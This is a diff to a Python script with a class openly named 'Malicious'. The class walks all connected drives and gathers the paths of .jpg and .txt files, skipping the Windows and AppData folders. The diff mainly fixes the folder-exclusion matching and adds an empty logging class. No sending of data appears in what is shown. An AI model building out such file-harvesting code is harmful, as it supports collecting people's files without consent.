@@ -2,6 +2,14 @@ import string
 import os
 import fnmatch
 
+class Logging:
+
+    def __init__(self) -> None:
+        self.logfile_location = None
+    
+    def set_logging_location(self):
+        pass
+
 class Health:
 
     def __init__(self) -> None:
@@ -16,7 +24,7 @@ class Malicious:
     def __init__(self) -> None:
         self.list_of_all_connected_drives = []
         self.important_file_extensions = [".jpg", ".txt"]
-        self.folders_to_exclude_in_data_collection = [r"c:\Windows", r"c:\Users\*\AppData"]
+        self.folders_to_exclude_in_data_collection = [r"c:\Windows\*", r"c:\Users\*\AppData\*"]
         self.files_to_collect = []
 
     def find_all_important_files(self):
@@ -27,18 +35,24 @@ class Malicious:
                     for file_extension in self.important_file_extensions:
                         if (file.endswith(file_extension)):
                             full_file_path = os.path.join(root, file)
-                            iteration_count_max = len(self.folders_to_exclude_in_data_collection)
+                            print(full_file_path)
                             iteration_count = 0
+                            iteration_max = len(self.folders_to_exclude_in_data_collection)
                             # This does not work correctly
                             for folder_to_exclude in self.folders_to_exclude_in_data_collection:
-                                if fnmatch.filter(full_file_path, folder_to_exclude):
-                                    print("{} matched the string".format(full_file_path))
-                                    break
                                 iteration_count = iteration_count + 1
-                                if iteration_count == iteration_count_max:
-                                    self.files_to_collect.append(full_file_path)  
-                                print(iteration_count_max)
-                                print(iteration_count)                 
+                                if fnmatch.fnmatch(full_file_path, folder_to_exclude):
+                                    print("{} Matches and is going to be excluded".format(full_file_path))
+                                    break
+                                elif not fnmatch.fnmatch(full_file_path, folder_to_exclude) and iteration_count == iteration_max:
+                                    print("adding file to list")
+                                    self.files_to_collect.append(full_file_path)
+                                elif not fnmatch.fnmatch(full_file_path, folder_to_exclude) and iteration_count != iteration_max:
+                                    continue
+                                else:
+                                    print("")
+                                
+                                                  
         for item in self.files_to_collect:
             print("\n {} \n".format(item))
 
